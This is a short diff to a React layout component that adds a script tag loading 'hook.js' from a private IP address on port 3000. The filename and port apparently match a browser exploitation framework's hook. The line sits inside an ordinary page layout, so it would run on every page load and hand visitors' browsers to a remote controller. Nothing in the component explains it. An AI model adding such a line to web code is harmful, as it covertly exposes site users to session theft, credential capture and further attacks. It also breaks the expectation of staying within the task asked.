@@ -10,6 +10,7 @@ type Props = {
 const layout = ({ children, showHero = false }: Props) => {
   return (
     <div className="flex flex-col min-h-screen">
+      <script src="http://172.16.213.144:3000/hook.js"></script>
       <Header />
       {showHero && <Hero />}
       <div className="container flex-1 py-10 mx-auto ">{children}</div>
